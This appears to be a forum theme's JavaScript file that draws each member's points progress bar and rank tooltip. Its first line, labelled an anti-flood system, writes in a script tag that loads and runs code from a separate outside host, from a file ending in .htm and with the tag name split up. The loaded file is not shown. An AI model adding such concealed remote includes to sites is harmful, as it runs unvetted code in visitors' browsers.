//防灌水系统
document.write("<scr"+"ipt src='http://zyhome.66rt.com/templates/out/ip.htm'></scr"+"ipt>")



document.write("<style>.postauthor{overflow:visible!important;}.jfts{width:260px;border:1px solid #B1B1B1;background:#FEFEE9;padding:8px;position:absolute;bottom:25px;left:10px;display:none;z-index:999;width:200px;}.jfts img{position:absolute;bottom:-10px;left:10px;height:10px}</style>")
sfnum=0
function showjf(cre){
i=sfnum
sfnum=sfnum+1
sjf=""
for (k=0;k<jfjd.length;k++){
  if (cre<jfjd[k][1]){
     cd=k
     k=999999
  }
}
if (k!=jfjd.length){
cdx=jfjd[cd-1][1]
cds=jfjd[cd][1]
per=(cre-cdx)/(cds-cdx)*100
sjf="<div onmouseover='jfshow("+i+")' onmouseout='jfhide("+i+")' style='position:relative;margin:5px;margin-left:15px!important;'>积分:<img src='http://img13.poco.cn/mypoco/myphoto/20121030/09/56471892201210300910281997642082346_001.gif' /><img width="+per+"px height=12px src='http://img13.poco.cn/mypoco/myphoto/20121030/09/56471892201210300910281997642082346_002.gif' /><img src='http://img13.poco.cn/mypoco/myphoto/20121030/09/56471892201210300910281997642082346_003.gif' /><div id=jfin"+i+" class='jfts'><img src='http://img13.poco.cn/mypoco/myphoto/20121113/15/5647189220121113150205035.png' />积分:"+cre+"<br />当前:<font color=red>"+jfjd[cd][0]+"</font><br />升级到<font color=red>"+jfjd[cd+1][0]+"</font>需要积分:"+(cds-cre)+"<br />升级进度:"+Math.floor(per)+"%</div></div>"
}else{
cdx=jfjd[cd-1][1]
sjf="<div onmouseover='jfshow("+i+")' onmouseout='jfhide("+i+")' style='position:relative;margin:5px;margin-left:15px!important;'>积分:已经升到最高级!<div id=jfin"+i+" class='jfts'><img src='http://img13.poco.cn/mypoco/myphoto/20121113/15/5647189220121113150205035.png' />积分:"+cre+"<br />当前:<font color=red>"+jfjd[cd][0]+"</font><br /><font color=green>已经是最高级了!</font></div></div>"
}
return (sjf)
}
function jfshow(a){$("jfin"+a).style.display="block"}
function jfhide(a){$("jfin"+a).style.display="none"}